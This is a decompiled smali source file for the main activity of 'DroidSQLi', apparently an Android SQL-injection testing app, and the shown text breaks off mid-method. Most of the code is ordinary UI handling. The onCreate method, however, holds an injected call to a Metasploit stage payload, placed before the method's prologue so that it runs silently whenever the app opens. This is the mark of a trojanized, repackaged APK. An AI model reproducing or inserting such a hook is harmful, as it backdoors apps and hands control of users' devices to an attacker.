.class public Lnet/edgard/droidsqli/main_activity;
.super Landroid/support/v4/app/FragmentActivity;
.source "main_activity.java"

# interfaces
.implements Ljava/util/Observer;
.implements Landroid/app/FragmentManager$OnBackStackChangedListener;


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lnet/edgard/droidsqli/main_activity$CardBackFragment;,
        Lnet/edgard/droidsqli/main_activity$CardFrontFragment;,
        Lnet/edgard/droidsqli/main_activity$ConsoleSlidePagerAdapter;,
        Lnet/edgard/droidsqli/main_activity$ResultListSlidePagerAdapter;
    }
.end annotation


# static fields
.field private static final CONSOLE_NUM_PAGES:I = 0x1

.field private static RESULT_NUM_PAGES:I

.field public static consoleContent:[Ljava/lang/StringBuilder;

.field private static values:[[Ljava/lang/String;


# instance fields
.field private columns:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List",
            "<",
            "Lnet/edgard/droidsqli/mvc/model/database/Column;",
            ">;"
        }
    .end annotation
.end field

.field private consolePager:Landroid/support/v4/view/ViewPager;

.field private consolePagerAdapter:Landroid/support/v4/view/PagerAdapter;

.field public controller:Lnet/edgard/droidsqli/mvc/controller/InjectionController;

.field private databases:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List",
            "<",
            "Lnet/edgard/droidsqli/mvc/model/database/Database;",
            ">;"
        }
    .end annotation
.end field

.field private listType:Ljava/lang/String;

.field private mHandler:Landroid/os/Handler;

.field private mShortAnimationDuration:I

.field private mShowingBack:Z

.field private mainActivity:Lnet/edgard/droidsqli/main_activity;

.field private model:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

.field private resultPager:Landroid/support/v4/view/ViewPager;

.field private resultPagerAdapter:Landroid/support/v4/view/PagerAdapter;

.field private tables:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List",
            "<",
            "Lnet/edgard/droidsqli/mvc/model/database/Table;",
            ">;"
        }
    .end annotation
.end field


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .prologue
    const/4 v0, 0x1

    .line 43
    sput v0, Lnet/edgard/droidsqli/main_activity;->RESULT_NUM_PAGES:I

    .line 55
    new-array v0, v0, [Ljava/lang/StringBuilder;

    sput-object v0, Lnet/edgard/droidsqli/main_activity;->consoleContent:[Ljava/lang/StringBuilder;

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    .prologue
    .line 41
    invoke-direct {p0}, Landroid/support/v4/app/FragmentActivity;-><init>()V

    .line 47
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, Lnet/edgard/droidsqli/main_activity;->databases:Ljava/util/List;

    .line 48
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, Lnet/edgard/droidsqli/main_activity;->tables:Ljava/util/List;

    .line 49
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, Lnet/edgard/droidsqli/main_activity;->columns:Ljava/util/List;

    .line 64
    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    iput-object v0, p0, Lnet/edgard/droidsqli/main_activity;->mHandler:Landroid/os/Handler;

    .line 65
    const/4 v0, 0x0

    iput-boolean v0, p0, Lnet/edgard/droidsqli/main_activity;->mShowingBack:Z

    .line 41
    return-void
.end method

.method static synthetic access$0(Lnet/edgard/droidsqli/main_activity;)Lnet/edgard/droidsqli/main_activity;
    .locals 1

    .prologue
    .line 57
    iget-object v0, p0, Lnet/edgard/droidsqli/main_activity;->mainActivity:Lnet/edgard/droidsqli/main_activity;

    return-object v0
.end method

.method static synthetic access$1(Lnet/edgard/droidsqli/main_activity;)Ljava/util/List;
    .locals 1

    .prologue
    .line 47
    iget-object v0, p0, Lnet/edgard/droidsqli/main_activity;->databases:Ljava/util/List;

    return-object v0
.end method

.method static synthetic access$10(Lnet/edgard/droidsqli/main_activity;)Landroid/support/v4/view/ViewPager;
    .locals 1

    .prologue
    .line 53
    iget-object v0, p0, Lnet/edgard/droidsqli/main_activity;->consolePager:Landroid/support/v4/view/ViewPager;

    return-object v0
.end method

.method static synthetic access$11(I)V
    .locals 0

    .prologue
    .line 43
    sput p0, Lnet/edgard/droidsqli/main_activity;->RESULT_NUM_PAGES:I

    return-void
.end method

.method static synthetic access$2(Lnet/edgard/droidsqli/main_activity;)Ljava/util/List;
    .locals 1

    .prologue
    .line 48
    iget-object v0, p0, Lnet/edgard/droidsqli/main_activity;->tables:Ljava/util/List;

    return-object v0
.end method

.method static synthetic access$3(Lnet/edgard/droidsqli/main_activity;)Ljava/util/List;
    .locals 1

    .prologue
    .line 49
    iget-object v0, p0, Lnet/edgard/droidsqli/main_activity;->columns:Ljava/util/List;

    return-object v0
.end method

.method static synthetic access$4()[[Ljava/lang/String;
    .locals 1

    .prologue
    .line 50
    sget-object v0, Lnet/edgard/droidsqli/main_activity;->values:[[Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$5()I
    .locals 1

    .prologue
    .line 43
    sget v0, Lnet/edgard/droidsqli/main_activity;->RESULT_NUM_PAGES:I

    return v0
.end method

.method static synthetic access$6(Lnet/edgard/droidsqli/main_activity;)Lnet/edgard/droidsqli/mvc/model/InjectionModel;
    .locals 1

    .prologue
    .line 59
    iget-object v0, p0, Lnet/edgard/droidsqli/main_activity;->model:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    return-object v0
.end method

.method static synthetic access$7(Lnet/edgard/droidsqli/main_activity;)V
    .locals 0

    .prologue
    .line 516
    invoke-direct {p0}, Lnet/edgard/droidsqli/main_activity;->flipCard()V

    return-void
.end method

.method static synthetic access$8(Lnet/edgard/droidsqli/main_activity;Lnet/edgard/droidsqli/mvc/model/InjectionModel;)V
    .locals 0

    .prologue
    .line 59
    iput-object p1, p0, Lnet/edgard/droidsqli/main_activity;->model:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    return-void
.end method

.method static synthetic access$9(Lnet/edgard/droidsqli/main_activity;)Landroid/support/v4/view/ViewPager;
    .locals 1

    .prologue
    .line 44
    iget-object v0, p0, Lnet/edgard/droidsqli/main_activity;->resultPager:Landroid/support/v4/view/ViewPager;

    return-object v0
.end method

.method private flipCard()V
    .locals 6

    .prologue
    const/4 v4, 0x1

    const/4 v3, 0x0

    const v2, 0x7f07000b

    .line 517
    iget-boolean v1, p0, Lnet/edgard/droidsqli/main_activity;->mShowingBack:Z

    if-eqz v1, :cond_0

    .line 519
    invoke-virtual {p0, v2}, Lnet/edgard/droidsqli/main_activity;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/TextView;

    invoke-virtual {v1, v4}, Landroid/widget/TextView;->setInputType(I)V

    .line 521
    invoke-virtual {p0}, Lnet/edgard/droidsqli/main_activity;->getFragmentManager()Landroid/app/FragmentManager;

    move-result-object v1

    invoke-virtual {v1}, Landroid/app/FragmentManager;->popBackStack()V

    .line 567
    :goto_0
    return-void

    .line 526
    :cond_0
    const-string v1, "input_method"

    invoke-virtual {p0, v1}, Lnet/edgard/droidsqli/main_activity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/inputmethod/InputMethodManager;

    .line 528
    .local v0, "imm":Landroid/view/inputmethod/InputMethodManager;
    invoke-virtual {p0, v2}, Lnet/edgard/droidsqli/main_activity;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/TextView;

    invoke-virtual {v1}, Landroid/widget/TextView;->getWindowToken()Landroid/os/IBinder;

    move-result-object v1

    invoke-virtual {v0, v1, v3}, Landroid/view/inputmethod/InputMethodManager;->hideSoftInputFromWindow(Landroid/os/IBinder;I)Z

    .line 530
    invoke-virtual {p0, v2}, Lnet/edgard/droidsqli/main_activity;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/TextView;

    invoke-virtual {v1, v3}, Landroid/widget/TextView;->setInputType(I)V

    .line 533
    iput-boolean v4, p0, Lnet/edgard/droidsqli/main_activity;->mShowingBack:Z

    .line 538
    invoke-virtual {p0}, Lnet/edgard/droidsqli/main_activity;->getFragmentManager()Landroid/app/FragmentManager;

    move-result-object v1

    .line 539
    invoke-virtual {v1}, Landroid/app/FragmentManager;->beginTransaction()Landroid/app/FragmentTransaction;

    move-result-object v1

    .line 546
    const v2, 0x7f040002

    const v3, 0x7f040003

    .line 547
    const/high16 v4, 0x7f040000

    const v5, 0x7f040001

    .line 545
    invoke-virtual {v1, v2, v3, v4, v5}, Landroid/app/FragmentTransaction;->setCustomAnimations(IIII)Landroid/app/FragmentTransaction;

    move-result-object v1

    .line 552
    const v2, 0x7f070004

    new-instance v3, Lnet/edgard/droidsqli/main_activity$CardBackFragment;

    invoke-direct {v3}, Lnet/edgard/droidsqli/main_activity$CardBackFragment;-><init>()V

    invoke-virtual {v1, v2, v3}, Landroid/app/FragmentTransaction;->replace(ILandroid/app/Fragment;)Landroid/app/FragmentTransaction;

    move-result-object v1

    .line 555
    const/4 v2, 0x0

    invoke-virtual {v1, v2}, Landroid/app/FragmentTransaction;->addToBackStack(Ljava/lang/String;)Landroid/app/FragmentTransaction;

    move-result-object v1

    .line 558
    invoke-virtual {v1}, Landroid/app/FragmentTransaction;->commit()I

    .line 563
    iget-object v1, p0, Lnet/edgard/droidsqli/main_activity;->mHandler:Landroid/os/Handler;

    new-instance v2, Lnet/edgard/droidsqli/main_activity$16;

    invoke-direct {v2, p0}, Lnet/edgard/droidsqli/main_activity$16;-><init>(Lnet/edgard/droidsqli/main_activity;)V

    invoke-virtual {v1, v2}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    goto :goto_0
.end method

.method private initInjectionEngine()V
    .locals 2
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/InterruptedException;
        }
    .end annotation

    .prologue
    .line 176
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lnet/edgard/droidsqli/main_activity$4;

    invoke-direct {v1, p0}, Lnet/edgard/droidsqli/main_activity$4;-><init>(Lnet/edgard/droidsqli/main_activity;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 187
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 188
    return-void
.end method

.method private initUIElements()V
    .locals 7

    .prologue
    const v6, 0x7f07000b

    .line 124
    const/4 v1, 0x0

    .local v1, "i":I
    :goto_0
    sget-object v3, Lnet/edgard/droidsqli/main_activity;->consoleContent:[Ljava/lang/StringBuilder;

    array-length v3, v3

    if-lt v1, v3, :cond_0

    .line 126
    const v3, 0x7f070004

    invoke-virtual {p0, v3}, Lnet/edgard/droidsqli/main_activity;->findViewById(I)Landroid/view/View;

    move-result-object v2

    check-cast v2, Landroid/widget/FrameLayout;

    .line 128
    .local v2, "item":Landroid/widget/FrameLayout;
    invoke-virtual {p0}, Lnet/edgard/droidsqli/main_activity;->getLayoutInflater()Landroid/view/LayoutInflater;

    move-result-object v3

    const v4, 0x7f030005

    invoke-virtual {v3, v4, v2}, Landroid/view/LayoutInflater;->inflate(ILandroid/view/ViewGroup;)Landroid/view/View;

    move-result-object v0

    .line 130
    .local v0, "child":Landroid/view/View;
    const v3, 0x7f070017

    invoke-virtual {p0, v3}, Lnet/edgard/droidsqli/main_activity;->findViewById(I)Landroid/view/View;

    move-result-object v3

    const/16 v4, 0x8

    invoke-virtual {v3, v4}, Landroid/view/View;->setVisibility(I)V

    .line 134
    invoke-virtual {p0}, Lnet/edgard/droidsqli/main_activity;->getWindow()Landroid/view/Window;

    move-result-object v3

    const/4 v4, 0x3

    invoke-virtual {v3, v4}, Landroid/view/Window;->setSoftInputMode(I)V

    .line 136
    invoke-virtual {v0, v6}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v3

    check-cast v3, Landroid/widget/TextView;

    const/4 v4, 0x0

    invoke-virtual {v3, v4}, Landroid/widget/TextView;->setCursorVisible(Z)V

    .line 138
    invoke-virtual {v0, v6}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v3

    check-cast v3, Landroid/widget/TextView;

    const-string v4, "http://10.0.0.1/target.php?id=1"

    invoke-virtual {v3, v4}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 140
    invoke-virtual {v0, v6}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v3

    check-cast v3, Landroid/widget/TextView;

    new-instance v4, Lnet/edgard/droidsqli/main_activity$1;

    invoke-direct {v4, p0, v0}, Lnet/edgard/droidsqli/main_activity$1;-><init>(Lnet/edgard/droidsqli/main_activity;Landroid/view/View;)V

    invoke-virtual {v3, v4}, Landroid/widget/TextView;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 146
    const v3, 0x7f070003

    invoke-virtual {p0, v3}, Lnet/edgard/droidsqli/main_activity;->findViewById(I)Landroid/view/View;

    move-result-object v3

    check-cast v3, Landroid/widget/ImageView;

    new-instance v4, Lnet/edgard/droidsqli/main_activity$2;

    invoke-direct {v4, p0}, Lnet/edgard/droidsqli/main_activity$2;-><init>(Lnet/edgard/droidsqli/main_activity;)V

    invoke-virtual {v3, v4}, Landroid/widget/ImageView;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 148
    invoke-virtual {p0}, Lnet/edgard/droidsqli/main_activity;->initConsolePager()V

    .line 150
    invoke-virtual {p0}, Lnet/edgard/droidsqli/main_activity;->initResultPager()V

    .line 151
    return-void

    .line 124
    .end local v0    # "child":Landroid/view/View;
    .end local v2    # "item":Landroid/widget/FrameLayout;
    :cond_0
    sget-object v3, Lnet/edgard/droidsqli/main_activity;->consoleContent:[Ljava/lang/StringBuilder;

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, ""

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    aput-object v4, v3, v1

    add-int/lit8 v1, v1, 0x1

    goto :goto_0
.end method

.method private updateResultListView()V
    .locals 3

    .prologue
    .line 391
    iget-object v0, p0, Lnet/edgard/droidsqli/main_activity;->listType:Ljava/lang/String;

    const-string v1, "database"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 395
    iget-object v0, p0, Lnet/edgard/droidsqli/main_activity;->mainActivity:Lnet/edgard/droidsqli/main_activity;

    new-instance v1, Lnet/edgard/droidsqli/main_activity$12;

    invoke-direct {v1, p0}, Lnet/edgard/droidsqli/main_activity$12;-><init>(Lnet/edgard/droidsqli/main_activity;)V

    invoke-virtual {v0, v1}, Lnet/edgard/droidsqli/main_activity;->runOnUiThread(Ljava/lang/Runnable;)V

    .line 470
    :goto_0
    return-void

    .line 413
    :cond_0
    iget-object v0, p0, Lnet/edgard/droidsqli/main_activity;->listType:Ljava/lang/String;

    const-string v1, "table"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    .line 415
    iget-object v0, p0, Lnet/edgard/droidsqli/main_activity;->mainActivity:Lnet/edgard/droidsqli/main_activity;

    new-instance v1, Lnet/edgard/droidsqli/main_activity$13;

    invoke-direct {v1, p0}, Lnet/edgard/droidsqli/main_activity$13;-><init>(Lnet/edgard/droidsqli/main_activity;)V

    invoke-virtual {v0, v1}, Lnet/edgard/droidsqli/main_activity;->runOnUiThread(Ljava/lang/Runnable;)V

    goto :goto_0

    .line 432
    :cond_1
    iget-object v0, p0, Lnet/edgard/droidsqli/main_activity;->listType:Ljava/lang/String;

    const-string v1, "column"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_2

    .line 434
    iget-object v0, p0, Lnet/edgard/droidsqli/main_activity;->mainActivity:Lnet/edgard/droidsqli/main_activity;

    new-instance v1, Lnet/edgard/droidsqli/main_activity$14;

    invoke-direct {v1, p0}, Lnet/edgard/droidsqli/main_activity$14;-><init>(Lnet/edgard/droidsqli/main_activity;)V

    invoke-virtual {v0, v1}, Lnet/edgard/droidsqli/main_activity;->runOnUiThread(Ljava/lang/Runnable;)V

    goto :goto_0

    .line 451
    :cond_2
    iget-object v0, p0, Lnet/edgard/droidsqli/main_activity;->listType:Ljava/lang/String;

    const-string v1, "value"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_3

    .line 453
    iget-object v0, p0, Lnet/edgard/droidsqli/main_activity;->mainActivity:Lnet/edgard/droidsqli/main_activity;

    new-instance v1, Lnet/edgard/droidsqli/main_activity$15;

    invoke-direct {v1, p0}, Lnet/edgard/droidsqli/main_activity$15;-><init>(Lnet/edgard/droidsqli/main_activity;)V

    invoke-virtual {v0, v1}, Lnet/edgard/droidsqli/main_activity;->runOnUiThread(Ljava/lang/Runnable;)V

    goto :goto_0

    .line 469
    :cond_3
    iget-object v0, p0, Lnet/edgard/droidsqli/main_activity;->mainActivity:Lnet/edgard/droidsqli/main_activity;

    const-string v1, "Error loading list..."

    const/4 v2, 0x0

    invoke-static {v0, v1, v2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    goto :goto_0
.end method


# virtual methods
.method public dispatch()V
    .locals 0
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    .line 117
    invoke-direct {p0}, Lnet/edgard/droidsqli/main_activity;->initUIElements()V

    .line 119
    invoke-direct {p0}, Lnet/edgard/droidsqli/main_activity;->initInjectionEngine()V

    .line 120
    return-void
.end method

.method public initConsolePager()V
    .locals 2

    .prologue
    .line 270
    const v0, 0x7f07000c

    invoke-virtual {p0, v0}, Lnet/edgard/droidsqli/main_activity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/support/v4/view/ViewPager;

    iput-object v0, p0, Lnet/edgard/droidsqli/main_activity;->consolePager:Landroid/support/v4/view/ViewPager;

    .line 271
    new-instance v0, Lnet/edgard/droidsqli/main_activity$ConsoleSlidePagerAdapter;

    invoke-virtual {p0}, Lnet/edgard/droidsqli/main_activity;->getFragmentManager()Landroid/app/FragmentManager;

    move-result-object v1

    invoke-direct {v0, p0, v1}, Lnet/edgard/droidsqli/main_activity$ConsoleSlidePagerAdapter;-><init>(Lnet/edgard/droidsqli/main_activity;Landroid/app/FragmentManager;)V

    iput-object v0, p0, Lnet/edgard/droidsqli/main_activity;->consolePagerAdapter:Landroid/support/v4/view/PagerAdapter;

    .line 272
    iget-object v0, p0, Lnet/edgard/droidsqli/main_activity;->consolePager:Landroid/support/v4/view/ViewPager;

    iget-object v1, p0, Lnet/edgard/droidsqli/main_activity;->consolePagerAdapter:Landroid/support/v4/view/PagerAdapter;

    invoke-virtual {v0, v1}, Landroid/support/v4/view/ViewPager;->setAdapter(Landroid/support/v4/view/PagerAdapter;)V

    .line 273
    iget-object v0, p0, Lnet/edgard/droidsqli/main_activity;->consolePager:Landroid/support/v4/view/ViewPager;

    new-instance v1, Lnet/edgard/droidsqli/main_activity$7;

    invoke-direct {v1, p0}, Lnet/edgard/droidsqli/main_activity$7;-><init>(Lnet/edgard/droidsqli/main_activity;)V

    invoke-virtual {v0, v1}, Landroid/support/v4/view/ViewPager;->setOnPageChangeListener(Landroid/support/v4/view/ViewPager$OnPageChangeListener;)V

    .line 290
    return-void
.end method

.method public initInjectionEngine2()V
    .locals 2
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/InterruptedException;
        }
    .end annotation

    .prologue
    .line 195
    iget-object v0, p0, Lnet/edgard/droidsqli/main_activity;->model:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    invoke-virtual {v0, p0}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->addObserver(Ljava/util/Observer;)V

    .line 197
    const v0, 0x7f070016

    invoke-virtual {p0, v0}, Lnet/edgard/droidsqli/main_activity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    new-instance v1, Lnet/edgard/droidsqli/main_activity$5;

    invoke-direct {v1, p0}, Lnet/edgard/droidsqli/main_activity$5;-><init>(Lnet/edgard/droidsqli/main_activity;)V

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 242
    return-void
.end method

.method public initResultPager()V
    .locals 2

    .prologue
    .line 245
    const v0, 0x7f070010

    invoke-virtual {p0, v0}, Lnet/edgard/droidsqli/main_activity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/support/v4/view/ViewPager;

    iput-object v0, p0, Lnet/edgard/droidsqli/main_activity;->resultPager:Landroid/support/v4/view/ViewPager;

    .line 246
    new-instance v0, Lnet/edgard/droidsqli/main_activity$ResultListSlidePagerAdapter;

    invoke-virtual {p0}, Lnet/edgard/droidsqli/main_activity;->getFragmentManager()Landroid/app/FragmentManager;

    move-result-object v1

    invoke-direct {v0, p0, v1}, Lnet/edgard/droidsqli/main_activity$ResultListSlidePagerAdapter;-><init>(Lnet/edgard/droidsqli/main_activity;Landroid/app/FragmentManager;)V

    iput-object v0, p0, Lnet/edgard/droidsqli/main_activity;->resultPagerAdapter:Landroid/support/v4/view/PagerAdapter;

    .line 247
    iget-object v0, p0, Lnet/edgard/droidsqli/main_activity;->resultPager:Landroid/support/v4/view/ViewPager;

    iget-object v1, p0, Lnet/edgard/droidsqli/main_activity;->resultPagerAdapter:Landroid/support/v4/view/PagerAdapter;

    invoke-virtual {v0, v1}, Landroid/support/v4/view/ViewPager;->setAdapter(Landroid/support/v4/view/PagerAdapter;)V

    .line 248
    iget-object v0, p0, Lnet/edgard/droidsqli/main_activity;->resultPager:Landroid/support/v4/view/ViewPager;

    new-instance v1, Lnet/edgard/droidsqli/main_activity$6;

    invoke-direct {v1, p0}, Lnet/edgard/droidsqli/main_activity$6;-><init>(Lnet/edgard/droidsqli/main_activity;)V

    invoke-virtual {v0, v1}, Landroid/support/v4/view/ViewPager;->setOnPageChangeListener(Landroid/support/v4/view/ViewPager$OnPageChangeListener;)V

    .line 267
    return-void
.end method

.method public onBackStackChanged()V
    .locals 1

    .prologue
    .line 572
    invoke-virtual {p0}, Lnet/edgard/droidsqli/main_activity;->getFragmentManager()Landroid/app/FragmentManager;

    move-result-object v0

    invoke-virtual {v0}, Landroid/app/FragmentManager;->getBackStackEntryCount()I

    move-result v0

    if-lez v0, :cond_0

    const/4 v0, 0x1

    :goto_0
    iput-boolean v0, p0, Lnet/edgard/droidsqli/main_activity;->mShowingBack:Z

    .line 575
    invoke-virtual {p0}, Lnet/edgard/droidsqli/main_activity;->invalidateOptionsMenu()V

    .line 576
    return-void

    .line 572
    :cond_0
    const/4 v0, 0x0

    goto :goto_0
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 4
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V

    .prologue
    const/4 v3, 0x7

    .line 71
    invoke-super {p0, p1}, Landroid/support/v4/app/FragmentActivity;->onCreate(Landroid/os/Bundle;)V

    .line 73
    invoke-virtual {p0, v3}, Lnet/edgard/droidsqli/main_activity;->requestWindowFeature(I)Z

    .line 75
    iput-object p0, p0, Lnet/edgard/droidsqli/main_activity;->mainActivity:Lnet/edgard/droidsqli/main_activity;

    .line 80
    const v1, 0x7f030001

    invoke-virtual {p0, v1}, Lnet/edgard/droidsqli/main_activity;->setContentView(I)V

    .line 82
    if-eqz p1, :cond_0

    .line 94
    invoke-virtual {p0}, Lnet/edgard/droidsqli/main_activity;->getFragmentManager()Landroid/app/FragmentManager;

    move-result-object v1

    invoke-virtual {v1}, Landroid/app/FragmentManager;->getBackStackEntryCount()I

    move-result v1

    if-lez v1, :cond_1

    const/4 v1, 0x1

    :goto_0
    iput-boolean v1, p0, Lnet/edgard/droidsqli/main_activity;->mShowingBack:Z

    .line 99
    :cond_0
    invoke-virtual {p0}, Lnet/edgard/droidsqli/main_activity;->getFragmentManager()Landroid/app/FragmentManager;

    move-result-object v1

    invoke-virtual {v1, p0}, Landroid/app/FragmentManager;->addOnBackStackChangedListener(Landroid/app/FragmentManager$OnBackStackChangedListener;)V

    .line 102
    invoke-virtual {p0}, Lnet/edgard/droidsqli/main_activity;->getWindow()Landroid/view/Window;

    move-result-object v1

    const v2, 0x7f030009

    invoke-virtual {v1, v3, v2}, Landroid/view/Window;->setFeatureInt(II)V

    .line 104
    invoke-virtual {p0}, Lnet/edgard/droidsqli/main_activity;->getResources()Landroid/content/res/Resources;

    move-result-object v1

    const/high16 v2, 0x10e0000

    invoke-virtual {v1, v2}, Landroid/content/res/Resources;->getInteger(I)I

    move-result v1

    iput v1, p0, Lnet/edgard/droidsqli/main_activity;->mShortAnimationDuration:I

    .line 107
    :try_start_0
    invoke-virtual {p0}, Lnet/edgard/droidsqli/main_activity;->dispatch()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 113
    :goto_1
    return-void

    .line 94
    :cond_1
    const/4 v1, 0x0

    goto :goto_0

    .line 108
    :catch_0
    move-exception v0

    .line 110
    .local v0, "e":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_1
.end method

.method toggleLoadingIndicator(Z)V
    .locals 3
    .param p1, "select"    # Z

    .prologue
    const/4 v1, 0x0

    const v2, 0x7f070017

    .line 155
    if-eqz p1, :cond_0

    .line 156
    invoke-virtual {p0, v2}, Lnet/edgard/droidsqli/main_activity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    invoke-virtual {v0, v1}, Landroid/view/View;->setAlpha(F)V

    .line 157
    invoke-virtual {p0, v2}, Lnet/edgard/droidsqli/main_activity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/view/View;->setVisibility(I)V

    .line 158
    invoke-virtual {p0, v2}, Lnet/edgard/droidsqli/main_activity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    invoke-virtual {v0}, Landroid/view/View;->animate()Landroid/view/ViewPropertyAnimator;

    move-result-object v0

    .line 159
    const/high16 v1, 0x3f800000    # 1.0f

    invoke-virtual {v0, v1}, Landroid/view/ViewPropertyAnimator;->alpha(F)Landroid/view/ViewPropertyAnimator;

    move-result-object v0

    .line 160
    iget v1, p0, Lnet/edgard/droidsqli/main_activity;->mShortAnimationDuration:I

    int-to-long v1, v1

    invoke-virtual {v0, v1, v2}, Landroid/view/ViewPropertyAnimator;->setDuration(J)Landroid/view/ViewPropertyAnimator;

    move-result-object v0

    .line 161
    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/view/ViewPropertyAnimator;->setListener(Landroid/animation/Animator$AnimatorListener;)Landroid/view/ViewPropertyAnimator;

    .line 173
    :goto_0
    return-void

    .line 163
    :cond_0
    invoke-virtual {p0, v2}, Lnet/edgard/droidsqli/main_activity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    invoke-virtual {v0}, Landroid/view/View;->animate()Landroid/view/ViewPropertyAnimator;

    move-result-object v0

    .line 164
    invoke-virtual {v0, v1}, Landroid/view/ViewPropertyAnimator;->alpha(F)Landroid/view/ViewPropertyAnimator;

    move-result-object v0

    .line 165
    iget v1, p0, Lnet/edgard/droidsqli/main_activity;->mShortAnimationDuration:I

    int-to-long v1, v1

    invoke-virtual {v0, v1, v2}, Landroid/view/ViewPropertyAnimator;->setDuration(J)Landroid/view/ViewPropertyAnimator;

    move-result-object v0

    .line 166
    new-instance v1, Lnet/edgard/droidsqli/main_activity$3;

    invoke-direct {v1, p0}, Lnet/edgard/droidsqli/main_activity$3;-><init>(Lnet/edgard/droidsqli/main_activity;)V

    invoke-virtual {v0, v1}, Landroid/view/ViewPropertyAnimator;->setListener(Landroid/animation/Animator$AnimatorListener;)Landroid/view/ViewPropertyAnimator;

    goto :goto_0
.end method

.method public update(Ljava/util/Observable;Ljava/lang/Object;)V
    .locals 8
    .param p1, "arg0"    # Ljava/util/Observable;
    .param p2, "arg1"    # Ljava/lang/Object;

    .prologue
    .line 295
    move-object v0, p1

    check-cast v0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    .local v0, "model":Lnet/edgard/droidsqli/mvc/model/InjectionModel;
    move-object v4, p2

    .line 297
    check-cast v4, Lnet/edgard/droidsqli/mvc/model/ObserverEvent;

    .line 299
    .local v4, "oEvent":Lnet/edgard/droidsqli/mvc/model/ObserverEvent;
    const-string v6, "end-preparation"

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v7, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_1

    .line 300
    new-instance v6, Lnet/edgard/droidsqli/main_activity$8;

    invoke-direct {v6, p0}, Lnet/edgard/droidsqli/main_activity$8;-><init>(Lnet/edgard/droidsqli/main_activity;)V

